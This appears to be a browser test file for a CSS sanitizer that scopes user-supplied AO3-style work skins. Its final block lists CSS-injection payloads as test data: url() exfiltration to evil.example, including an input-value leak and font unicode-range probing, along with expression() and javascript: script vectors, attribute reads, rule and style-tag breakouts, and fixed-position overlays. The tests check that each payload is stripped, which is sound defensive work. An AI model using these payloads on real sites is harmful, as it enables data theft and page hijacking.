// Runs in headless Chromium (vite.config.ts, the browser project): the skin sanitizer's safety
// depends on the real CSS parser and on how the browser applies `@scope`.

import { afterEach, beforeEach, describe, expect, it } from 'vitest';

import { sanitizeSkin, skinScopeClass } from './skin.ts';

/** The sanitized sheet as text, or '' when nothing survived. */
function clean(css: string): string {
	const sheet = sanitizeSkin(css);
	return sheet === undefined ? '' : [...sheet.cssRules].map((r) => r.cssText).join('\n');
}

/** The rules inside the sheet's one `@scope`, as text. */
function rules(css: string): string[] {
	const sheet = sanitizeSkin(css);
	if (sheet === undefined) {
		return [];
	}
	expect(sheet.cssRules).toHaveLength(1);
	const scope = sheet.cssRules[0];
	expect(scope).toBeInstanceOf(CSSScopeRule);
	expect((scope as CSSScopeRule).start).toBe(`.${skinScopeClass}`);
	expect((scope as CSSScopeRule).end).toBeNull();
	return [...(scope as CSSScopeRule).cssRules].map((r) => r.cssText);
}

function el(tag: string, className: string, ...children: Element[]): HTMLElement {
	const e = document.createElement(tag);
	e.className = className;
	e.append('Lorem', ...children);
	return e;
}

/**
 * The page around a work, as stage 8 builds it: outside, the frame, the scope, #workskin and
 * its content, then outside again.
 */
let page: {
	before: HTMLElement;
	frame: HTMLElement;
	scope: HTMLElement;
	workskin: HTMLElement;
	inner: HTMLElement;
	after: HTMLElement;
};

beforeEach(() => {
	const inner = el('p', 'chat');
	const workskin = el('div', '', inner);
	workskin.id = 'workskin';
	const scope = el('div', skinScopeClass, workskin);
	const frame = el('div', 'frame', scope);
	page = { before: el('p', 'outside'), frame, scope, workskin, inner, after: el('p', 'outside') };
	document.body.append(page.before, frame, page.after);
});

afterEach(() => {
	document.adoptedStyleSheets = [];
	document.body.replaceChildren();
});

function apply(css: string): void {
	const sheet = sanitizeSkin(css);
	document.adoptedStyleSheets = sheet === undefined ? [] : [sheet];
}

function color(e: Element): string {
	return getComputedStyle(e).color;
}

const red = 'rgb(255, 0, 0)';

describe('sanitizeSkin', () => {
	it('keeps an AO3 work skin and applies it inside #workskin', () => {
		apply(
			'#workskin .chat { color: #f00; background-color: rgba(0, 0, 0, 0.5); ' +
				"font-family: 'Courier New', monospace; border: 1px solid red; margin: 0 auto; " +
				'text-align: center; transform: rotate(5deg) translateX(2px); }\n' +
				'#workskin p.chat:hover, #workskin > div { font-weight: bold !important; }'
		);
		const s = getComputedStyle(page.inner);
		expect(s.color).toBe(red);
		expect(s.backgroundColor).toBe('rgba(0, 0, 0, 0.5)');
		expect(s.fontFamily).toBe('"Courier New", monospace');
		expect(s.borderTopStyle).toBe('solid');
		expect(s.textAlign).toBe('center');
		expect(s.transform).not.toBe('none');
		expect(color(page.before)).not.toBe(red);
	});

	it('copies declarations as the browser parsed them, priority included', () => {
		// The CSSOM serializes !important declarations last.
		expect(rules('#workskin .a { color: red !important; padding: 1px 2px; }')).toEqual([
			'#workskin .a { padding: 1px 2px; color: red !important; }'
		]);
	});

	it('returns undefined when nothing survives', () => {
		for (const css of ['', '   ', 'not css at all', '@import url(x.css);', '#workskin { --x: 1; }', '}}}{']) {
			expect(sanitizeSkin(css), css).toBeUndefined();
		}
	});

	it('only reaches elements inside the scope', () => {
		const selectors = [
			'*', 'html', 'body', ':root', 'p', '.outside', '.frame', 'div', 'body > *',
			'#workskin ~ *', '#workskin + *', `.${skinScopeClass} ~ *`, `.${skinScopeClass} + *`,
			':scope ~ *', ':scope + *', '& ~ *', '& + *', ':scope ~ .outside', 'body:has(#workskin) .outside',
			':not(#workskin) .outside', ':is(body) .outside', ':where(*)', 'html:has(.chat) body',
			'.frame:has(:scope)', ':has(~ .frame)', '.outside:has(+ .frame)', '.frame ~ .outside'
		];
		for (const sel of selectors) {
			apply(`${sel} { color: red; background-color: red; }`);
			for (const [name, e] of Object.entries({
				before: page.before,
				after: page.after,
				frame: page.frame,
				body: document.body,
				html: document.documentElement
			})) {
				expect(color(e), `${sel} reached ${name}`).not.toBe(red);
			}
		}
		// A selector without :scope or & is relative to the scope (`:where(:scope) *`), so it
		// matches below the scope element; only :scope reaches the scope element itself.
		apply('* { color: red; }');
		expect(color(page.scope)).not.toBe(red);
		expect(color(page.workskin)).toBe(red);
		expect(color(page.inner)).toBe(red);
		apply(':scope { color: red; }');
		expect(color(page.scope)).toBe(red);
		expect(color(page.frame)).not.toBe(red);
	});

	// The rename keeps Chrome from logging a refused @import (the e2e hostile-work test checks
	// the console); it must not change which rules survive.
	it('renames @import without changing what survives', () => {
		for (const css of [
			'@import url(x.css); #workskin .a { color: red; }',
			'@IMPORT "x.css" screen; #workskin .a { color: red; }',
			'@import url(x.css) { #workskin .b { color: blue; } } #workskin .a { color: red; }',
			// An escaped @import isn't renamed: replaceSync refuses it and the loop drops it.
			'@\\69mport url(x.css); #workskin .a { color: red; }'
		]) {
			expect(rules(css), css).toEqual(['#workskin .a { color: red; }']);
		}
	});

	it('drops every at-rule, keeping only plain style rules', () => {
		const css = [
			'@import url(https://evil.example/a.css);',
			'@import "https://evil.example/b.css" screen;',
			'@namespace svg url(http://www.w3.org/2000/svg);',
			"@font-face { font-family: x; src: url(https://evil.example/f.woff2); }",
			'@media screen { #workskin p { color: red; } }',
			'@supports (color: red) { #workskin p { color: red; } }',
			'@container (min-width: 1px) { #workskin p { color: red; } }',
			'@layer a { #workskin p { color: red; } }',
			'@layer b;',
			'@keyframes k { from { color: red; } to { color: blue; } }',
			'@property --p { syntax: "<color>"; inherits: false; initial-value: red; }',
			'@page { margin: 0; }',
			'@scope (body) { p { color: red; } }',
			'@starting-style { #workskin p { color: red; } }',
			'@counter-style c { system: cyclic; symbols: "*"; }',
			'@font-feature-values Font { @swash { a: 1; } }',
			'@view-transition { navigation: auto; }',
			'@position-try --t { top: 0; }',
			'#workskin .kept { color: blue; }'
		].join('\n');
		expect(rules(css)).toEqual(['#workskin .kept { color: blue; }']);
	});

	it('drops nested rules, keeping the parent’s own declarations', () => {
		expect(
			rules('#workskin .a { color: blue; & .b { color: red; } .c { color: red; } @media screen { color: red; } }')
		).toEqual(['#workskin .a { color: blue; }']);
	});

	it('drops properties otwarchive does not allow', () => {
		expect(
			rules(
				'#workskin .a { color: blue; pointer-events: none; mask-image: none; will-change: top; ' +
					'animation-name: k; grid-row: 1; -webkit-user-modify: read-write; contain: none; ' +
					'isolation: isolate; }'
			)
		).toEqual(['#workskin .a { color: blue; }']);
	});

	it('matches shorthand names anywhere in a longhand, as otwarchive does', () => {
		// legal_shorthand_property? is an unanchored match: "column" allows grid-column too.
		expect(rules('#workskin .a { grid-column: 1; grid-row: 1; }')).toEqual(['#workskin .a { grid-column: 1; }']);
		// inset is top/right/bottom/left, each allowed, so the browser writes it back as inset.
		expect(rules('#workskin .a { inset: 0; }')).toEqual(['#workskin .a { inset: 0px; }']);
	});

	it('keeps otwarchive properties, their longhands and vendor-prefixed forms', () => {
		const [r] = rules(
			'#workskin .a { border-top-left-radius: 3px; margin-left: 1em; text-decoration-line: underline; ' +
				'overflow-x: hidden; flex-grow: 1; column-gap: 2px; list-style-type: square; ' +
				'transition-duration: 1s; outline-color: red; position: absolute; top: 0; z-index: 2; ' +
				'-webkit-box-shadow: 1px 1px red; }'
		);
		for (const p of [
			'border-top-left-radius', 'margin-left', 'text-decoration-line', 'overflow-x', 'flex-grow',
			'column-gap', 'list-style-type', 'transition-duration', 'outline-color', 'position',
			'top', 'z-index', 'box-shadow'
		]) {
			expect(r, p).toContain(`${p}:`);
		}
	});

	it('drops position: fixed and keeps the other positions', () => {
		expect(rules('#workskin .a { position: fixed; color: blue; }')).toEqual(['#workskin .a { color: blue; }']);
		expect(rules('#workskin .a { position: FIXED !important; }')).toEqual([]);
		for (const p of ['absolute', 'relative', 'sticky', 'static']) {
			expect(rules(`#workskin .a { position: ${p}; }`)).toEqual([`#workskin .a { position: ${p}; }`]);
		}
	});

	it('drops custom properties and var(), even inside shorthands', () => {
		expect(
			rules(
				'#workskin .a { --c: red; color: var(--c); background: var(--c) no-repeat; ' +
					'margin: var(--m, 1px) 2px; width: calc(var(--w) * 2); height: 1px; }'
			)
		).toEqual(['#workskin .a { height: 1px; }']);
	});

	it('keeps value functions that load nothing', () => {
		const css =
			'#workskin .a { color: rgb(1 2 3); border-color: hsl(10 20% 30%) oklch(0.5 0.1 20) ' +
			'color-mix(in srgb, red, blue) lab(50 1 2); width: calc(100% - 2em); height: clamp(1px, 2vw, 3px); ' +
			'background-image: linear-gradient(red, blue); transform: matrix(1, 0, 0, 1, 0, 0) scale(2); ' +
			'filter: blur(1px) drop-shadow(1px 1px 2px red) hue-rotate(10deg); ' +
			'transition-timing-function: cubic-bezier(0.1, 0.2, 0.3, 0.4); clip: rect(1px, 2px, 3px, 4px); }';
		const [r] = rules(css);
		// The browser writes hsl() back as rgb().
		for (const v of ['rgb(', 'oklch(', 'color-mix(', 'lab(', 'calc(', 'clamp(', 'linear-gradient(',
			'matrix(', 'blur(', 'drop-shadow(', 'cubic-bezier(', 'rect(']) {
			expect(r, v).toContain(v);
		}
	});

	it('keeps quoted content, counters and quotes', () => {
		const [r] = rules(
			'#workskin .a::before { content: "Lorem: "; counter-increment: n; quotes: "«" "»"; }\n' +
				'#workskin .b::after { content: counter(n) ". "; }'
		);
		expect(r).toContain('content: "Lorem: "');
		expect(rules('#workskin .b::after { content: counter(n) ". "; }')).toEqual([
			'#workskin .b::after { content: counter(n) ". "; }'
		]);
	});
});

describe('sanitizeSkin refuses CSS-injection payloads', () => {
	// Each payload must leave nothing that loads, runs, reads attributes or escapes the scope:
	// checked on the text of the result and, applied live, on elements outside the scope.
	const payloads: string[] = [
		// loading anything (exfiltration, tracking)
		'#workskin .a { background: url(https://evil.example/x.png) red; }',
		'#workskin .a { background-image: url("https://evil.example/x.png"); }',
		"#workskin .a { background-image: url('/images/x.png'); }",
		'#workskin .a { background-image: URL(https://evil.example/x.png); }',
		'#workskin .a { background-image: u\\72 l(https://evil.example/x.png); }',
		'#workskin .a { background-image: \\75 rl(https://evil.example/x.png); }',
		'#workskin .a { background-image: ur/**/l(https://evil.example/x.png); }',
		'#workskin .a { background-image: image-set("https://evil.example/x.png" 1x); }',
		'#workskin .a { background-image: -webkit-image-set(url(https://evil.example/x.png) 1x); }',
		'#workskin .a { background-image: cross-fade(url(https://evil.example/x.png), red 50%); }',
		'#workskin .a { background-image: image(url(https://evil.example/x.png)); }',
		'#workskin .a { background-image: element(#workskin); }',
		'#workskin .a { background-image: -moz-element(#workskin); }',
		'#workskin .a { background-image: paint(evil); }',
		'#workskin .a { background-image: src("https://evil.example/x.png"); }',
		'#workskin .a { background-image: linear-gradient(red, blue), url(https://evil.example/x.png); }',
		'#workskin .a { list-style: square url(https://evil.example/x.png); }',
		'#workskin .a { list-style-image: url(https://evil.example/x.png); }',
		'#workskin .a { border-image: url(https://evil.example/x.png) 30 round; }',
		'#workskin .a { cursor: url(https://evil.example/c.cur), auto; }',
		'#workskin .a::before { content: url(https://evil.example/x.png); }',
		'#workskin .a { mask: url(https://evil.example/m.svg#m); }',
		'#workskin .a { filter: url(https://evil.example/f.svg#f); }',
		'#workskin .a { clip-path: url(https://evil.example/c.svg#c); }',
		'#workskin .a { shape-outside: url(https://evil.example/x.png); }',
		'#workskin .a { offset-path: url(https://evil.example/p.svg#p); }',
		'#workskin input[value^="a"] { background: url(https://evil.example/?a); }',
		'@import url(https://evil.example/a.css); #workskin .a { color: red; }',
		'@import "https://evil.example/a.css"; #workskin .a { color: red; }',
		'@font-face { font-family: e; src: url(https://evil.example/?f); unicode-range: U+41; } #workskin .a { font-family: e; }',
		'@font-face { font-family: e; src: local(Arial); }',
		'@namespace url(https://evil.example/);',
		// script and old engines' extensions
		'#workskin .a { width: expression(alert(1)); }',
		'#workskin .a { behavior: url(evil.htc); }',
		'#workskin .a { -moz-binding: url(https://evil.example/x.xml#x); }',
		'#workskin .a { background-image: url(javascript:alert(1)); }',
		'#workskin .a { background-image: url(data:image/svg+xml,<svg onload=alert(1)>); }',
		// reading the page
		'#workskin .a::before { content: attr(title); }',
		'#workskin .a { width: attr(data-w px); }',
		'#workskin .a { padding: env(safe-area-inset-top); }',
		'#workskin .a { --x: url(https://evil.example/x.png); background: var(--x); }',
		// breaking out of a rule or the sheet
		'#workskin .a { color: red; } body { color: red; }',
		'#workskin .a { color: red;} } body { color: red; }',
		'#workskin .a { color: red; } </style><script>alert(1)</script> body { color: red; }',
		'#workskin .a { color: "red}" ; } body { color: red; }',
		'#workskin .a { color: red; /* } body { color: red; } */ }',
		'#workskin .a, body { color: red; }',
		'#workskin .a { color: red\\; } body { color: red; }',
		// overlaying the page
		'#workskin .a { position: fixed; inset: 0; z-index: 2147483647; }',
		'#workskin .a { position: fixed !important; top: 0; left: 0; width: 100vw; height: 100vh; }',
		'body .outside, html, :root { display: none; }',
		':scope ~ .outside { display: none; }',
		'& ~ .outside, :scope + .outside { visibility: hidden; color: red; }'
	];

	const loads = /\b(?:url|image-set|image|cross-fade|element|paint|src|attr|env|var|expression|local)\(|@|-moz-binding|behavior|javascript:/i;

	for (const css of payloads) {
		it(css, () => {
			const out = clean(css);
			const inner = out.replace(`@scope (.${skinScopeClass})`, '');
			expect(inner, 'loads, reads or nests').not.toMatch(loads);
			expect(inner).not.toMatch(/position:\s*fixed/i);
			apply(css);
			for (const e of [page.before, page.after, page.frame, document.body, document.documentElement]) {
				const s = getComputedStyle(e);
				expect(s.color).not.toBe(red);
				expect(s.display).not.toBe('none');
				expect(s.visibility).not.toBe('hidden');
			}
			expect(getComputedStyle(page.inner).position).not.toBe('fixed');
		});
	}
});
